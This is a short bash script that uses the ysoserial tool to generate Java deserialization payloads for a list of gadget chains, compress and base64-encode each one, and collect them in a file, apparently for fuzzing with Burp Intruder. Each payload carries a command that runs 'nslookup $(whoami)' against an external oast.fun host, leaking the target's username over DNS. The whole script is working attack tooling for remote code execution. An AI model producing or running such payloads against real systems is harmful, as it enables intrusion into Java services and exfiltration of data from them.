#!/bin/bash
# Java Deserialization with ysoserial

while IFS= read -r payload;do
    echo "[!] PAYLOAD: $payload"
    java --add-opens java.base/java.util=ALL-UNNAMED -jar /sec/root/ysoserial-all.jar $payload 'nslookup $(whoami).qxypmuratwcjbqftuineubx60s7g2f8wl.oast.fun'|gzip -c|(echo;base64 -w0) >>intruder.txt 2>/dev/null
done < payloads.txt
